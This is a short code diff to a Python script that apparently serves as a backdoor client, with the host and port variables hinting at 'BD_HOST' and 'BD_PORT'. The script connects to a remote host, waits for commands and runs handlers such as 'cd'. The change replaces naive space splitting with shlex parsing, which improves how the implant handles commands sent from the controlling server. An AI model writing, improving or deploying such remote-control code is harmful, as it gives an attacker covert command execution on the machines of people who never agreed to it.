@@ -1,6 +1,7 @@
 import socket
 import os
 import time
+import shlex
 
 REMOTE_HOST = "127.0.0.1"  # str(os.environ.get("BD_HOST"))
 REMOTE_PORT = 5004  # int(os.environ.get("BD_PORT"))
@@ -33,12 +34,11 @@ while True:
     print("[-] Awaiting commands...")
     recvString = server.recv(1024)
     recvString = recvString.decode()
-    inputList = recvString.split(" ")
+    inputList = shlex.split(recvString)
     # command variable
     command = inputList[0]
     # list with all the given args
-    args = inputList.copy()
-    del (args[0])
+    args = inputList[1:]
 
     if command == "cd":
         new_path = os.path.join(pwd, args[0])
